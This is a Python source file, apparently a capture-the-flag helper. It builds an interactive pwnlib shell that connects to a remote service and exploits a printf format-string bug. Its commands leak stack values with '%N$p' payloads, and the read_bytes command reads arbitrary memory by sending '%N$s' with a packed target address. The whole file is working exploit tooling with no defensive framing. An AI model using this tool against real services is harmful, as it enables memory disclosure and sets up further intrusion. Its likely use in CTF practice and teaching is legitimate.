import shell
import pwnlib
import re

from shell import Command

class NoConnectionException(Exception):
    pass

class PrintfShell(shell.Shell):
    def __init__(self, read, write, marker=b"$ ", conn=None):
        shell.Shell.__init__(self)
        self.read = read
        self.write = write
        self.conn = conn
        self.marker = marker
        self.stack_offset = None

    @Command
    def raw(self, *args):
        print(args)
        text = b" ".join(bytes(arg, "ascii") for arg in args)
        self.conn.send(text+b"\n")
        result = self.conn.recv()
        print(result)
        return result

    @Command
    def set_offset(self, n : int):
        self.stack_offset = int(n)

    @Command
    def connect(self, address, port):
        port = int(port)
        self.conn = pwnlib.tubes.remote.remote(address, port)
        self.conn.recvuntil(self.marker)
        print(self.conn)
    
    def read_response(self, string, marker=None):
        if marker is None:
            marker = self.marker
        string = self.write(string)
        self.conn.send(string)
        resp = self.conn.recvuntil(self.marker)
        return self.read(resp[:-len(self.marker)])
    
    @Command
    def show_stack(self, n : int):
        n = int(n)
        if not self.conn:
            raise NoConnectionException("You need to connect first")
        stack = []
        for i in range(1, n+1):
            value = self.read_response(bytes(f"%{i}$p", 'ascii'))
            stack.append(value)
        print(stack)
        for index, value in enumerate(stack):
            if value == b"(nil)":
                value = b"0x0"
            _, value = value.strip().split(b"0x")
            bs = int(value, 16).to_bytes(8, byteorder="little")
            print(f"{index+1:<4} {str(value, 'ascii'):<16} {repr(bs)}")
        return stack
    
    @Command
    def read_bytes(self, addr : int, n : int):
        if self.stack_offset is None:
            print("need to set the stack offset `set_offset`")
            return
        n = int(n)
        addr = int(addr,16)
        command = bytes(f"%{self.stack_offset+1}$s", "ascii")
        padn = (8 - len(command) % 8) % 8
        pad = b"X"*padn
        all_bytes = b""
        offset = 0
        while len(all_bytes) < n:
            suffix = pad + pwnlib.util.packing.p64(addr + offset)
            res = self.read_response(command + suffix)
            res = res[:-len(suffix)]
            res = res + b"\x00"
            all_bytes += res
            offset += len(all_bytes)
        print(all_bytes)
        return all_bytes

shell = PrintfShell(read=lambda x: x[:-1], write=lambda x:x+b"\n")
shell.runloop()